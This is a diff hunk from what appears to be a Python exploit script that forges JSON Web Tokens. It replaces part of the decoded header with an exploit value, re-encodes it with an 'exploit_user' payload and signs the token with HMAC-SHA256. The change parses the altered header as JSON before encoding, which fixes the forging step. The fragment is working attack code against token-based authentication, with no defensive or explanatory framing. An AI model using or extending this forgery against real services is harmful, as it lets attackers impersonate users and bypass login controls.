@@ -100,7 +100,8 @@ print("PAYLOAD: " + MAG + payload_decode + RESETT)
 print("\n" + "Ecode the new payload...."+ "\n")
 
 new_hederjwt = header_decode.replace(search, exploit)
-urlstr = base64.urlsafe_b64encode(bytes(json.dumps(new_hederjwt),encoding='utf8')).decode('utf8').rstrip("=")+"."+base64.urlsafe_b64encode(bytes(json.dumps(exploit_user),encoding='utf8')).decode('utf8').rstrip("=")
+res = json.loads(new_hederjwt)
+urlstr = base64.urlsafe_b64encode(bytes(json.dumps(res),encoding='utf8')).decode('utf8').rstrip("=")+"."+base64.urlsafe_b64encode(bytes(json.dumps(exploit_user),encoding='utf8')).decode('utf8').rstrip("=")
 sig = base64.urlsafe_b64encode(hmac.new(bytes(key,encoding='utf8'),urlstr.encode('utf8'),hashlib.sha256).digest()).decode('utf8').rstrip("=")
 
 print(urlstr+"."+sig)
